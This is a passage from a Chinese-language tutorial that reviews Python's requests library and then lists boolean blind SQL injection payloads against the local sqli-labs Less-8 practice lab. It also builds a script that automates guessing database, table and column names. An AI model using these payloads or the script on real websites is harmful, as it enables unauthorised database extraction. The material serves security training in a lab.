True，如果不小于 400，则返回 False</td></tr><tr><td align="left">raise_for_status()</td><td align="left">如果发生错误，方法返回一个 HTTPError 对象</td></tr><tr><td align="left">reason</td><td align="left">响应状态的描述，比如 “Not Found” 或 “OK”</td></tr><tr><td align="left">request</td><td align="left">返回请求此响应的请求对象</td></tr><tr><td align="left">status_code</td><td align="left">返回 http 的状态码，比如 404 和 200（200 是 OK，404 是 Not Found）</td></tr><tr><td align="left">text</td><td align="left">返回响应的内容，unicode 类型数据</td></tr><tr><td align="left">url</td><td align="left">返回响应的 URL</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 http 的状态码</span></span><br><span class="line"><span class="built_in">print</span>(x.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 响应状态的描述</span></span><br><span class="line"><span class="built_in">print</span>(x.reason)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回编码</span></span><br><span class="line"><span class="built_in">print</span>(x.apparent_encoding)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line">OK</span><br><span class="line">utf-<span class="number">8</span></span><br></pre></td></tr></table></figure><p><strong>requests 方法：</strong></p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">delete(<em>url</em>, <em>args</em>)</td><td align="left">发送 DELETE 请求到指定 url</td></tr><tr><td align="left">get(<em>url</em>, <em>params, args</em>)</td><td align="left">发送 GET 请求到指定 url</td></tr><tr><td align="left">head(<em>url</em>, <em>args</em>)</td><td align="left">发送 HEAD 请求到指定 url</td></tr><tr><td align="left">patch(<em>url</em>, <em>data, args</em>)</td><td align="left">发送 PATCH 请求到指定 url</td></tr><tr><td align="left">post(<em>url</em>, <em>data, json, args</em>)</td><td align="left">发送 POST 请求到指定 url</td></tr><tr><td align="left">put(<em>url</em>, <em>data, args</em>)</td><td align="left">发送 PUT 请求到指定 url</td></tr><tr><td align="left">request(<em>method</em>, <em>url</em>, <em>args</em>)</td><td align="left">向指定的 url 发送指定的请求方法</td></tr></tbody></table><p>使用 requests.request() 发送 get 请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.request(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.status_code)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><p>设置请求头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">kw = &#123;<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;python 教程&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;https://www.runoob.com/&quot;</span>, params = kw, headers = headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应状态码</span></span><br><span class="line"><span class="built_in">print</span> (response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span> (response.encoding)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span> (response.url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line">UTF-<span class="number">8</span></span><br><span class="line">https://www.runoob.com/?s=python+%E6%<span class="number">95</span>%<span class="number">99</span>%E7%A8%8B</span><br><span class="line"></span><br><span class="line"><span class="meta">... </span>其他内容...</span><br></pre></td></tr></table></figure><p>post() 方法可以发送 POST 请求到指定 url，一般格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data=&#123;key: value&#125;, json=&#123;key: value&#125;, args)</span><br></pre></td></tr></table></figure><ul><li><strong>url</strong> 请求 url。</li><li><strong>data</strong> 参数为要发送到指定 url 的字典、元组列表、字节或文件对象。</li><li><strong>json</strong> 参数为要发送到指定 url 的 JSON 对象。</li><li><strong>args</strong> 为其他参数，比如 cookies、headers、verify等。</li></ul><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.post(<span class="string">&#x27;https://www.runoob.com/try/ajax/demo_post.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;本内容是使用 POST 方法请求的。&lt;/p&gt;&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;请求时间：</span><br><span class="line"><span class="number">2022</span>-05-<span class="number">26</span> <span class="number">17</span>:<span class="number">30</span>:<span class="number">47</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>post请求带参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表单参数，参数名为 fname 和 lname</span></span><br><span class="line">myobj = &#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;RUNOOB&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Boy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.post(<span class="string">&#x27;https://www.runoob.com/try/ajax/demo_post2.php&#x27;</span>, data = myobj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;你好，RUNOOB Boy，今天过得怎么样？&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><strong>附加请求参数</strong></p><p>发送请求我们可以在请求中附加额外的参数，例如请求头、查询参数、请求体等，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;  <span class="comment"># 设置请求头</span></span><br><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;  <span class="comment"># 设置查询参数</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;example&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;  <span class="comment"># 设置请求体</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;https://www.runoob.com&#x27;</span>, headers=headers, params=params, data=data)</span><br></pre></td></tr></table></figure><p>上述代码发送一个 POST 请求，并附加了请求头、查询参数和请求体。</p><p>除了基本的 GET 和 POST 请求外，requests 还支持其他 HTTP 方法，如 PUT、DELETE、HEAD、OPTIONS 等。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们的脚本首先要实现的是向指定页面以指定方式发送请求，所以要用到一下几个东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">text</th><th>返回响应的内容，unicode 类型数据</th></tr></thead></table><p><code>text</code>返回响应的内容，在布尔盲注时，我们根据响应的内容的长度来判断页面回显的真假</p><p>有了这些知识，我们就可以继续脚本的编写了</p><h2 id="手动盲注payload"><a href="#手动盲注payload" class="headerlink" title="手动盲注payload"></a>手动盲注payload</h2><p>手动盲注的payload是脚本的核心，接下来的脚本的SQL注入语句都在这里</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>先判断库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=1 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=3 --+</span></span><br><span class="line"><span class="string">......</span></span><br></pre></td></tr></table></figure><p>猜解库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (substr(database(),1,1))=&quot;a&quot; --+</span></span><br></pre></td></tr></table></figure><p>获取表的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=4 --+</span><br></pre></td></tr></table></figure><p>获取表的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 1,1)=8 --+</span></span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure><p>获取列数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.cloumns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;)=3 --+</span></span><br></pre></td></tr></table></figure><p>获取列长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)=2 --+</span></span><br></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1)=105 --+</span></span><br></pre></td></tr></table></figure><p>获数据数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(username) from users)=13 --+</span></span><br></pre></td></tr></table></figure><p>获取数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(username) from users limit 0,1)=4 --+</span></span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))=68 --+</span></span><br></pre></td></tr></table></figure><h2 id="开始写脚本"><a href="#开始写脚本" class="headerlink" title="开始写脚本"></a>开始写脚本</h2><h4 id="头部："><a href="#头部：" class="headerlink" title="头部："></a>头部：</h4><p>首先实现对知道网页发送请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url)</span><br></pre></td></tr></table></figure><p>可以对url参数中的url发起请求</p><p>我们使用<code>normalHtmlLen</code>来存放响应长度，通过比较响应长度来判断页面回显的真假</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="comment"># normalHtmlLen是页面为真时的响应头的长度，和它比较来判断页面回显是否为真</span></span><br><span class="line"><span class="comment"># 我们知道当id=1时回显为真</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))   <span class="comment"># 打印响应头长度</span></span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span>       <span class="comment"># 响应头长度，初值为0</span></span><br></pre></td></tr></table></figure><h4 id="第一部分：猜解库名"><a href="#第一部分：猜解库名" class="headerlink" title="第一部分：猜解库名"></a>第一部分：猜解库名</h4><ol><li><p>首先判断库名的长度</p><p>通过一次循环来判断，输出库名长度</p></li><li><p>接着猜解库名</p><p>这里用两层循环，分别控制<code>substr</code>截取的地方和判断相等的地方</p><p><code>for a in range(33,127):</code>这里用ascii码来判断</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断库名长度</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dbNameLen_url)       <span class="comment"># 每次输出payload,方便测试</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dbNameLen == <span class="number">30</span>:          </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)       </span><br><span class="line">        <span class="keyword">break</span>                <span class="comment"># 30次判断仍不对则则报错</span></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span>              <span class="comment"># 定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))=&#x27;&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 拼接URL,变量是substr的第2个参数,有两处需要拼接的地方</span></span><br><span class="line">        <span class="built_in">print</span>(dbName_url)</span><br><span class="line">        <span class="comment"># 每次拼接完成后看看效果,测试有没有拼接错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="comment"># 将符合的字母填充到预先设计好的空字符串中</span></span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span><span class="comment"># 结束的是单次的内部循环,不能结束外部循环</span></span><br></pre></td></tr></table></figure><h4 id="第二部分：猜解表名"><a href="#第二部分：猜解表名" class="headerlink" title="第二部分：猜解表名"></a>第二部分：猜解表名</h4><ol><li>判断表的个数</li><li>判断每个表的长度</li><li>猜解每个表</li></ol><p>这部分和猜解库名时的不同是：表的个数有多个，所以我们需要分别将每个表的长度判断出来再猜解表名</p><p>这就需要一个稍复杂的循环，这是脚本中最复杂的部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断表名数量、各个表名长度并猜解表名</span></span><br><span class="line">sheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sheNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=&quot;</span> +<span class="built_in">str</span>(sheNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">    <span class="comment"># COUNT(*) 函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(sheNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of sche:&quot;</span>+<span class="built_in">str</span>(sheNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sheNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解表的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是判断表名长度并猜解表名</span></span><br><span class="line">sheNames=<span class="string">&quot;&quot;</span>              <span class="comment"># 最后输出所以表名用，定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, sheNum):</span><br><span class="line">    sheNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sheNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(sheNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="built_in">print</span>(sheNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of schename&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(sheNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sheNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 猜解表名        </span></span><br><span class="line">    sheName = <span class="string">&quot;&quot;</span>    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            sheName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(sheName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheName_url).text) == normalHtmlLen:</span><br><span class="line">                sheName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(sheName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    sheNames+=sheName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;database: &quot;</span>+dbName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tabales: &quot;</span>+sheNames)</span><br><span class="line"><span class="comment"># 库名表名猜解完成</span></span><br></pre></td></tr></table></figure><h4 id="第三部分：猜解列名"><a href="#第三部分：猜解列名" class="headerlink" title="第三部分：猜解列名"></a>第三部分：猜解列名</h4><p>本部分的思路与猜解表名是相同，就不多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line">database = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的数据库: &quot;</span>)</span><br><span class="line">table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line"><span class="comment"># 可选择要查的表</span></span><br><span class="line"></span><br><span class="line">colNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    colNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27;)=&quot;</span> +<span class="built_in">str</span>(colNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># COUNT函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(colNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span 